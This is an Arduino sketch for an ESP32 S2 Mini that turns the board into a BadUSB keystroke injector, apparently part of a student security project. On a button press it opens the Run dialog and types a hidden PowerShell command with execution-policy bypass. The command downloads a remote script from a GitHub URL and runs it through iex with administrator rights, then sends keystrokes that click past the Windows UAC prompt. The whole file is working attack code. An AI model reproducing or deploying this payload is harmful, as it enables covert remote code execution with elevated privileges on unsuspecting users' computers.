#include <Arduino.h>
#include "USB.h"
#include "USBHIDKeyboard.h"

USBHIDKeyboard Keyboard;
const int buttonPin = 0; // Nút BOOT trên S2 Mini

void setup() {
  pinMode(buttonPin, INPUT_PULLUP);
  Keyboard.begin();
  USB.begin();
}

void loop() {
  if (digitalRead(buttonPin) == LOW) {
    delay(200); // Chống rung phím

    // 1. Initial delay to ensure the system is ready (DELAY 2500)
    delay(2500);

    // 2. Minimize all active windows (GUI d)
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('d');
    delay(100);
    Keyboard.releaseAll();
    delay(500);

    // 3. Open Run dialog (GUI r)
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(100);
    Keyboard.releaseAll();
    delay(500);

    // 4. Execute PowerShell hidden with administrative privileges
    // LƯU Ý: THAY <LINK> BẰNG ĐƯỜNG DẪN TỚI FILE ps.ps1 CỦA BẠN
    Keyboard.print("powershell -w h -NoP -Ep Bypass -Command \"irm https://github.com/Sunlaii/ANM-Esp32BadUSB/blob/MinhNhat/src/ps.ps1| iex\"");
    delay(200);

    // Nhấn CTRL + SHIFT + ENTER để chạy bằng quyền Admin
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(KEY_LEFT_SHIFT);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.releaseAll();
    delay(1000);

    // 5. Vượt qua hộp thoại UAC (User Account Control) của Windows
    // Nhấn phím mũi tên Trái (để chọn Yes) rồi Enter
    Keyboard.press(KEY_LEFT_ARROW);
    delay(100);
    Keyboard.releaseAll();
    delay(500);
    
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.releaseAll();

    // 6. Flash CAPSLOCK as an indicator that execution is complete
    // Nháy đèn Caps Lock 4 lần để báo hiệu xong
    for(int i = 0; i < 4; i++) {
      Keyboard.press(KEY_CAPS_LOCK);
      delay(100);
      Keyboard.releaseAll();
      delay(500);
    }

    // Chờ nhả nút để kết thúc
    while(digitalRead(buttonPin) == LOW) delay(10);
  }
}